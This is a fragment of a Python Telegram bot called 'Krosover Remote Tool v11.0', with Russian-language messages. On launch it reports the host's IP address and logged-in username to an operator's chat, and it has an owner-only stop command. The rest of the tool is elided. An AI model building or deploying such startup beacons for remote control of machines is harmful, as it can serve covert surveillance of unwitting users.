...
def send_hello():
    try:
        ...
        msg = (f"🚀 **Система Remote Tool v11.0 ONLINE!**\n"
               f"🌐 IP: `{ip}`\n"
               f"👤 Юзер: `{os.getlogin()}`\n\n"
...
def stop_cmd(message):
    if message.chat.id == MY_ID:
        bot.send_message(message.chat.id, "👋 Система Remote Tool 11.0 уходит в оффлайн. До связи!")
...
if __name__ == '__main__':
    ...
    print(">>> Krosover Remote Tool v11.0 (Ultimate) запущен!") 
    send_hello()
    while True:
        try:
